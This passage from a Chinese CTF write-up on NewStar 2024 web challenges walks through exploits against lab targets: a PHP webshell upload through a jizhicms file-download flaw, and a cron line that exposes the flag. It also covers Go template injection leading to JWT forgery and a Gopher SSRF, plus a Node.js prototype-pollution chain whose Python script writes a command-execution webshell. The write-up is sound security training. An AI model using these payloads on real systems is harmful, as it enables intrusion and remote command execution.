class="hljs-string">&quot;已结束&quot;</span>)<br>        <span class="hljs-keyword">break</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;最终情况: <span class="hljs-subst">&#123;flag&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure><h3 id="chocolate"><a class="markdownIt-Anchor" href="#chocolate"></a> chocolate</h3><p>开头直接dirsearch扫了一遍</p><p><img src="/../../images/Newstar/2024/44.png" alt="44"></p><p>第一层数字截断绕过</p><p><img src="/../../images/Newstar/2024/45.png" alt="45"></p><p>第二层md5</p><p><img src="/../../images/Newstar/2024/46.png" alt="46"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><br><span class="hljs-comment"># 要寻找的前五位哈希</span><br>target_prefix = <span class="hljs-string">&#x27;8031b&#x27;</span><br><br><span class="hljs-comment"># 从这里开始你可以定义要搜索的范围</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10000000</span>):  <span class="hljs-comment"># 你可以根据需要调整这个范围</span><br>    next_level = <span class="hljs-built_in">str</span>(i)  <span class="hljs-comment"># 可以尝试其他类型的输入</span><br>    <span class="hljs-comment"># 计算 MD5 哈希</span><br>    <span class="hljs-keyword">if</span> hashlib.md5(next_level.encode()).hexdigest().startswith(target_prefix):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;找到的值: <span class="hljs-subst">&#123;next_level&#125;</span>&#x27;</span>)<br>        <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;no&quot;</span>)<br></code></pre></td></tr></table></figure><p>第三层大小写绕过bp发包</p><p><img src="/../../images/Newstar/2024/47.png" alt="47"></p><p>最后一层直接bpfuzz一下</p><p><img src="/../../images/Newstar/2024/48.png" alt="48"></p><h3 id="ezcmsss复现"><a class="markdownIt-Anchor" href="#ezcmsss复现"></a> ezcmsss(复现)</h3><p>用dir扫目录可以发现有www.zip，下载下来里面有后台管理的账户和密码<code>admin_name=jizhicms1498 &amp; admin_pass=4oP4fB51r5</code></p><p>后台界面在<code>admin.php</code>里登入后台，发现 jizhicms v1.9.5 有一个管理界面的任意文件下载漏洞，插件里面只有一个不能出网，<s>我到这里当时就卡住了</s>实际流程是需要在将<code>.zip</code>文件上传到题目容器里，然后通过任意文件下载漏洞本地下载解压</p><p>其中的一种是在<code>栏目管理-栏目列表-新增栏目</code>中增加附件，上传构造好的php🐎的压缩包</p><p>上传的时候bp截取然后获取压缩包的内容</p><p><img src="/../../images/Newstar/2024/50.png" alt="50"></p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">/static/upload/file/20241104/1730714912409405.zip<br></code></pre></td></tr></table></figure><p>然后就可以按照网上泄露的漏洞来打了</p><p><img src="/../../images/Newstar/2024/51.png" alt="51"></p><p><code>filepath</code>的参数随意，然后把刚才抓到的zip路径贴上去</p><p>然后对文件进行解压</p><p><img src="/../../images/Newstar/2024/52.png" alt="52"></p><p>最后跟进<code>/A/exts/ma.php</code>进行命令执行</p><p><img src="/../../images/Newstar/2024/53.png" alt="53"></p><p>没注意群里的提醒是不出网的，一直在想着出网，解题思路和我想的基本一致。</p><h3 id="隐藏的密码复现"><a class="markdownIt-Anchor" href="#隐藏的密码复现"></a> 隐藏的密码(复现)</h3><p>java还没会，学一下。找不到密码目录扫描</p><p><img src="/../../images/Newstar/2024/54.png" alt="54"></p><p>可以扫到 <code>env</code> 和 <code>jolokia</code> 端点</p><p><img src="/../../images/Newstar/2024/55.png" alt="55"></p><p>可以找到 <code>caef11.passwd</code> 属性是隐藏的</p><p><img src="/../../images/Newstar/2024/56.png" alt="56"></p><p>读到密码后，根据题目描述和属性的名字可得用户名为 <code>caef11</code></p><p>通过写定时任务（计划任务）的方式，以 flag 为文件名在根目录创建新文件，通过 <code>ls</code> 查看 flag</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-emphasis">*/1 *</span> * * * root cat /flag | xargs -I &#123;&#125; touch /&#123;&#125;<br></code></pre></td></tr></table></figure><p>具体就不会写了，不会java的有苦头了，之后有空一定学。</p><h3 id="pangbai-过家家4复现"><a class="markdownIt-Anchor" href="#pangbai-过家家4复现"></a> PangBai 过家家（4）(复现)</h3><p>hint:You just need to read main.go for solving this challenge.</p><p>直接定位<code>main.go</code>文件，前端在/eye路由上存在模板注入，定位一下关键代码</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs go">tmplStr := strings.Replace(<span class="hljs-type">string</span>(content), <span class="hljs-string">&quot;%s&quot;</span>, input, <span class="hljs-number">-1</span>)<br>tmpl, err := template.New(<span class="hljs-string">&quot;eye&quot;</span>).Parse(tmplStr)<br><br><span class="hljs-comment">// render template</span><br>helper := Helper&#123;User: user, Config: config&#125;<br>err = tmpl.Execute(w, helper)<br></code></pre></td></tr></table></figure><p>将 <code>content</code> 中的所有 <code>&quot;%s&quot;</code> 替换为 <code>input</code> 字符串，从而生成最终的模板字符串 <code>tmplStr</code></p><p>定义并实例化 <code>Helper</code> 结构体，将 <code>user</code> 和 <code>config</code> 数据结构传入，用于后续的模板渲染。这个 <code>Helper</code> 结构体充当模板中的数据源</p><p><code>Execute</code> 方法用于将 <code>helper</code> 中的数据渲染进模板 <code>tmpl</code> 中，并输出到 <code>w</code>（例如 <code>http.ResponseWriter</code>）。这里会将 <code>helper</code> 中的字段（如 <code>User</code>、<code>Config</code> 等）渲染到模板中被占位符引用的位置。</p><p>引用官方的解释</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs markdown">tmpl.Execute 函数用于将 tmpl 对象中的模板字符串进行渲染，第一个参数传入的是一个 Writer 对象，后面是一个上下文，在模板字符串中，可以使用 &#123;&#123; . &#125;&#125; 获取整个上下文，或使用 &#123;&#123; .A.B &#125;&#125; 进行层级访问。若上下文中含有函数，也支持 &#123;&#123; .Func &quot;param&quot; &#125;&#125; 的方式传入变量。并且还支持管道符运算。<br><br>在本题中，由于 utils.go 定义的 Stringer 对象中的 String 方法，对继承他的每一个 struct，在转换为字符串时都会返回 [struct]，所以直接使用 &#123;&#123; . &#125;&#125; 返回全局的上下文结构会返回 [struct].<br></code></pre></td></tr></table></figure><p>在/eye路由下，可以追溯<code>Helper</code>和<code>Config</code>两个结构体，可以尝试获取Jwt</p><p><img src="/../../images/Newstar/2024/61.png" alt="61"></p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">AYZowY3EtOmSZpn3Zh0TaGCMY72SMDSr2LvK5a3zYc7OD2cNpN0KkvnsClLkLJ95<br></code></pre></td></tr></table></figure><p>然后看另外一个路由/favorite</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">routeFavorite</span><span class="hljs-params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;<br><br><span class="hljs-keyword">if</span> r.Method == http.MethodPut &#123;<br><br><span class="hljs-comment">// ensure only localhost can access</span><br>requestIP := r.RemoteAddr[:strings.LastIndex(r.RemoteAddr, <span class="hljs-string">&quot;:&quot;</span>)]<br>fmt.Println(<span class="hljs-string">&quot;Request IP:&quot;</span>, requestIP)<br><span class="hljs-keyword">if</span> requestIP != <span class="hljs-string">&quot;127.0.0.1&quot;</span> &amp;&amp; requestIP != <span class="hljs-string">&quot;[::1]&quot;</span> &#123;<br>w.WriteHeader(http.StatusForbidden)<br>w.Write([]<span class="hljs-type">byte</span>(<span class="hljs-string">&quot;Only localhost can access&quot;</span>))<br><span class="hljs-keyword">return</span><br>&#125;<br><br>token, _ := r.Cookie(<span class="hljs-string">&quot;token&quot;</span>)<br><br>o, err := validateJwt(token.Value)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>w.Write([]<span class="hljs-type">byte</span>(err.Error()))<br><span class="hljs-keyword">return</span><br>&#125;<br><br><span class="hljs-keyword">if</span> o.Name == <span class="hljs-string">&quot;PangBai&quot;</span> &#123;<br>w.WriteHeader(http.StatusAccepted)<br>w.Write([]<span class="hljs-type">byte</span>(<span class="hljs-string">&quot;Hello, PangBai!&quot;</span>))<br><span class="hljs-keyword">return</span><br>&#125;<br><br><span class="hljs-keyword">if</span> o.Name != <span class="hljs-string">&quot;Papa&quot;</span> &#123;<br>w.WriteHeader(http.StatusForbidden)<br>w.Write([]<span class="hljs-type">byte</span>(<span class="hljs-string">&quot;You cannot access!&quot;</span>))<br><span class="hljs-keyword">return</span><br>&#125;<br><br>body, err := ioutil.ReadAll(r.Body)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>http.Error(w, <span class="hljs-string">&quot;error&quot;</span>, http.StatusInternalServerError)<br>&#125;<br>config.SignaturePath = <span class="hljs-type">string</span>(body)<br>w.WriteHeader(http.StatusOK)<br>w.Write([]<span class="hljs-type">byte</span>(<span class="hljs-string">&quot;ok&quot;</span>))<br><span class="hljs-keyword">return</span><br>&#125;<br></code></pre></td></tr></table></figure><p>网页的右下角是个文件读的结果，文件路径默认为 <code>config.SignaturePath</code> 即 <code>./sign.txt</code> 的内容。</p><p>代码说明了如果是<code>PUT</code>请求可以进入修改<code>config.SignaturePath</code> 的值，但是需要让name值为<code>Papa</code>才能进行</p><p>这里先构造一个jwt伪造(注意密钥不要带多余的空格)</p><p><img src="/../../images/Newstar/2024/65.png" alt="65"></p><p>于是解题思路：利用泄露的 <code>JwtKey</code> 伪造 Cookie，对 <code>/favorite</code> 发起 PUT 请求以修改 <code>config.SignaturePath</code>，然后访问 <code>/favorite</code> 获取文件读的内容。同时题目还给了限制必须来自<code>127.0.0.1</code></p><p>定位代码</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(c Helper)</span></span> Curl(url <span class="hljs-type">string</span>) <span class="hljs-type">string</span> &#123;<br>fmt.Println(<span class="hljs-string">&quot;Curl:&quot;</span>, url)<br>cmd := exec.Command(<span class="hljs-string">&quot;curl&quot;</span>, <span class="hljs-string">&quot;-fsSL&quot;</span>, <span class="hljs-string">&quot;--&quot;</span>, url)<br>_, err := cmd.CombinedOutput()<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>fmt.Println(<span class="hljs-string">&quot;Error: curl:&quot;</span>, err)<br><span class="hljs-keyword">return</span> <span class="hljs-string">&quot;error&quot;</span><br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-string">&quot;ok&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure><p>定义了一个名为 <code>Curl</code> 的方法，它属于 <code>Helper</code> 结构体，并通过调用 <code>curl</code> 命令去访问指定的 URL。它的主要功能是发送一个 HTTP 请求并返回结果。<code>--</code> 的存在，我们没有办法进行任何命令注入或选项控制，但 curl 命令并不是只能发起 HTTP 请求，它也支持其它很多的协议，例如 FTP、Gopher 等，其中 Gopher 协议能满足我们的要求。</p><p><img src="/../../images/Newstar/2024/62.png" alt="62"></p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs markdown">PUT /favorite HTTP/1.1<br>Host: localhost:8000<br>Content-Type: text/plain<br>Cookie: token=<br>Content-Length: 18<br><br>/proc/self/environ<br></code></pre></td></tr></table></figure><p>然后构造 PUT 请求原始报文，Body 内容为想要读取的文件内容，这里读取环境变量</p><p><img src="/../../images/Newstar/2024/63.png" alt="63"></p><p>读取之后前去可以查看flag</p><p><img src="/../../images/Newstar/2024/64.png" alt="64"></p><h3 id="ezpollute复现"><a class="markdownIt-Anchor" href="#ezpollute复现"></a> ezpollute(复现)</h3><p>看一下部署文件Node.js 版本为 16，使用了 <code>node-dev</code> 热部署启动</p><p>在<code>index.js</code>里面的<code>/config</code>路由下存在<code>merge</code>,大概率存在原生链污染</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">try</span> &#123;<br>        finalConfig = <span class="hljs-title function_">clone</span>(defaultWaterMarkConfig)<br>        <span class="hljs-title function_">merge</span>(finalConfig, userConfig)<br>        fs.<span class="hljs-title function_">writeFileSync</span>(path.<span class="hljs-title function_">join</span>(__dirname, <span class="hljs-string">&#x27;uploads&#x27;</span>, userID, <span class="hljs-string">&#x27;config.json&#x27;</span>), <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(finalConfig))<br>        ctx.<span class="hljs-property">body</span> = &#123;<br>            <span class="hljs-attr">code</span>: <span class="hljs-number">1</span>,<br>            <span class="hljs-attr">msg</span>: <span class="hljs-string">&#x27;Config updated successfully&#x27;</span>,<br>        &#125;<br>    &#125; <span class="hljs-keyword">catch</span> (e) &#123;<br>        ctx.<span class="hljs-property">body</span> = &#123;<br>            <span class="hljs-attr">code</span>: <span class="hljs-number">0</span>,<br>            <span class="hljs-attr">msg</span>: <span class="hljs-string">&#x27;Some error occurred&#x27;</span>,<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> &#123; clone, merge &#125; = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;./utils/merge&#x27;</span>)<br></code></pre></td></tr></table></figure><p><code>merge</code> 函数在 <code>/util/merge.js</code> 中，跳过名为 <code>__proto__</code> 的属性，以防止原型链污染漏洞；跳过值为空字符串 <code>&quot;&quot;</code> 的属性。但我们可以通过 <code>constructor.prototype</code> 来绕过限制(<code>constructor.prototype</code> 是对象的一个属性，可以用来访问并修改对象的原型。)</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs js"># merge.<span class="hljs-property">js</span><br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> key <span class="hljs-keyword">in</span> source) &#123;<br>        <span class="hljs-keyword">if</span> (key === <span class="hljs-string">&quot;__proto__&quot;</span>) <span class="hljs-keyword">continue</span><br>        <span class="hljs-keyword">if</span> (source[key] === <span class="hljs-string">&quot;&quot;</span>) <span class="hljs-keyword">continue</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_">isObject</span>(source[key]) &amp;&amp; key <span class="hljs-keyword">in</span> target) &#123;<br>            target[key] = <span class="hljs-title function_">merge</span>(target[key], source[key]);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            target[key] = source[key];<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p><code>/process</code> 路由调用了 <code>fork</code>，创建了一个 JavaScript 子进程用于水印添加</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">try</span> &#123;<br>       <span class="hljs-keyword">await</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve, reject</span>) =&gt;</span> &#123;<br><br>           <span class="hljs-keyword">const</span> proc = <span class="hljs-title function_">fork</span>(<span class="hljs-title class_">PhotoProcessScript</span>, [userDir], &#123; <span class="hljs-attr">silent</span>: <span class="hljs-literal">true</span> &#125;)<br><br>           proc.<span class="hljs-title function_">on</span>(<span class="hljs-string">&#x27;close&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">code</span>) =&gt;</span> &#123;<br>               <span class="hljs-keyword">if</span> (code === <span class="hljs-number">0</span>) &#123;<br>                   <span class="hljs-title function_">resolve</span>(<span class="hljs-string">&#x27;success&#x27;</span>)<br>               &#125; <span class="hljs-keyword">else</span> &#123;<br>                   <span class="hljs-title function_">reject</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&#x27;An error occurred during execution&#x27;</span>))<br>               &#125;<br>           &#125;)<br><br>           proc.<span class="hljs-title function_">on</span>(<span class="hljs-string">&#x27;error&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">err</span>) =&gt;</span> &#123;<br>               <span class="hljs-title function_">reject</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">`Failed to start subprocess: <span class="hljs-subst">$&#123;err.message&#125;</span>`</span>))<br>           &#125;)<br>       &#125;)<br>       ctx.<span class="hljs-property">body</span> = &#123;<br>           <span class="hljs-attr">code</span>: <span class="hljs-number">1</span>,<br>           <span class="hljs-attr">msg</span>: <span class="hljs-string">&#x27;Photos processed successfully&#x27;</span>,<br>       &#125;<br>   &#125;<br></code></pre></td></tr></table></figure><p>可以污染 <code>NODE_OPTIONS</code> 和 <code>env</code>，在 <code>env</code> 中写入恶意代码，<code>fork</code> 在创建子进程时就会首先加载恶意代码，从而实现 RCE,但题目不出网，所以需要换一种写法</p><p>这种写法在复现的时候没打通，按道理是可以的因为有root权限</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js">&#123;<span class="hljs-string">&quot;constructor&quot;</span>: &#123;<span class="hljs-string">&quot;prototype&quot;</span>: &#123;<span class="hljs-string">&quot;NODE_OPTIONS&quot;</span>: <span class="hljs-string">&quot;--require /proc/self/environ&quot;</span>, <span class="hljs-string">&quot;env&quot;</span>: &#123; <span class="hljs-string">&quot;EVIL&quot;</span>:<span class="hljs-string">&quot;console.log(require(\&quot;child_process\&quot;).execSync(\&quot;cp /flag static/script.js\&quot;).toString())//&quot;</span>&#125;&#125;&#125;&#125;<br><br></code></pre></td></tr></table></figure><p>官p的思路差不多写个shell进去</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">from</span> time <span class="hljs-keyword">import</span> sleep<br><br>url = <span class="hljs-string">&quot;http://url:port&quot;</span><br><br><span class="hljs-comment"># 获取 token</span><br><span class="hljs-comment"># 随便发送点图片获取 token</span><br>files = [<br>    (<span class="hljs-string">&#x27;images&#x27;</span>, (<span class="hljs-string">&#x27;anno.png&#x27;</span>, <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./1.png&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>), <span class="hljs-string">&#x27;image/png&#x27;</span>)),<br>    (<span class="hljs-string">&#x27;images&#x27;</span>, (<span class="hljs-string">&#x27;soyo.png&#x27;</span>, <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./2.png&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>), <span class="hljs-string">&#x27;image/png&#x27;</span>))<br>]<br>res = requests.post(url + <span class="hljs-string">&quot;/upload&quot;</span>, files=files)<br>token = res.headers.get(<span class="hljs-string">&#x27;Set-Cookie&#x27;</span>)<br><span class="hljs-keyword">match</span> = re.search(<span class="hljs-string">r&#x27;token=([a-f0-9\-\.]+)&#x27;</span>, token)<br><span class="hljs-keyword">if</span> <span class="hljs-keyword">match</span>:<br>    token = <span class="hljs-keyword">match</span>.group(<span class="hljs-number">1</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] token: <span class="hljs-subst">&#123;token&#125;</span>&quot;</span>)<br>headers = &#123;<br>    <span class="hljs-string">&#x27;Cookie&#x27;</span>: <span class="hljs-string">f&#x27;token=<span class="hljs-subst">&#123;token&#125;</span>&#x27;</span><br>&#125;<br><br><br><span class="hljs-comment"># 写入 WebShell</span><br>webshell = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">const Koa = require(&#x27;koa&#x27;)</span><br><span class="hljs-string">const Router = require(&#x27;koa-router&#x27;)</span><br><span class="hljs-string">const app = new Koa()</span><br><span class="hljs-string">const router = new Router()</span><br><span class="hljs-string"></span><br><span class="hljs-string">router.get(&quot;/webshell&quot;, async (ctx) =&gt; &#123;</span><br><span class="hljs-string">    const &#123;cmd&#125; = ctx.query</span><br><span class="hljs-string">    res = require(&#x27;child_process&#x27;).execSync(cmd).toString()</span><br><span class="hljs-string">    return ctx.body = &#123;</span><br><span class="hljs-string">        res</span><br><span class="hljs-string">    &#125;</span><br><span class="hljs-string">&#125;)</span><br><span class="hljs-string"></span><br><span class="hljs-string">app.use(router.routes())</span><br><span class="hljs-string">app.listen(3000, () =&gt; &#123;</span><br><span class="hljs-string">    console.log(&#x27;http://127.0.0.1:3000&#x27;)</span><br><span class="hljs-string">&#125;)</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><span class="hljs-comment"># 将 WebShell 内容 Base64 编码</span><br>encoded_webshell = base64.b64encode(webshell.encode()).decode()<br><br><span class="hljs-comment"># Base64 解码后写入文件</span><br>payload = &#123;<br>    <span class="hljs-string">&quot;constructor&quot;</span>: &#123;<br>        <span class="hljs-string">&quot;prototype&quot;</span>: &#123;<br>            <span class="hljs-string">&quot;NODE_OPTIONS&quot;</span>: <span class="hljs-string">&quot;--require /proc/self/environ&quot;</span>,<br>            <span class="hljs-string">&quot;env&quot;</span>: &#123;<br>                <span class="hljs-string">&quot;A&quot;</span>: <span class="hljs-string">f&quot;require(\&quot;child_process\&quot;).execSync(\&quot;echo <span class="hljs-subst">&#123;encoded_webshell&#125;</span> | base64 -d &gt; /app/index.js\&quot;)//&quot;</span><br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment"># 原型链污染</span><br>requests.post(url + <span class="hljs-string">&quot;/config&quot;</span>, json=payload, headers=headers)<br><br><span class="hljs-comment"># 触发 fork 实现 RCE</span><br><span class="hljs-keyword">try</span>:<br>    requests.post(url + <span class="hljs-string">&quot;/process&quot;</span>, headers=headers)<br><span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>    <span class="hljs-keyword">pass</span><br><br>sleep(<span class="hljs-number">2</span>)<br><span class="hljs-comment"># 访问有回显的 WebShell</span><br>res = requests.get(url + <span class="hljs-string">&quot;/webshell?cmd=cat /flag&quot;</span>)<br><span class="hljs-built_in">print</span>(res.text)<br></code></pre></td></tr></table></figure><h2 id="misc-4"><a class="markdownIt-Anchor" href="#misc-4"></a> misc</h2><h3 id="扫码领取flag"><a class="markdownIt-Anchor" href="#扫码领取flag"></a> 扫码领取flag</h3><p>hint看一下里面base64解密，另外一个图片crc爆破一下得到二维码，搜索一下对应的二维码种类得到flag</p><h2 id="crypto-4"><a class="markdownIt-Anchor" href="#crypto-4"></a> crypto</h2><h3 id="圣石匕首"><a class="markdownIt-Anchor" href="#圣石匕首"></a> 圣石匕首</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">from</span> sage.<span class="hljs-built_in">all</span> <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># Parameters</span><br>beta = <span class="hljs-number">0.37</span><br>delta = <span class="hljs-number">0.01</span><br>e = <span 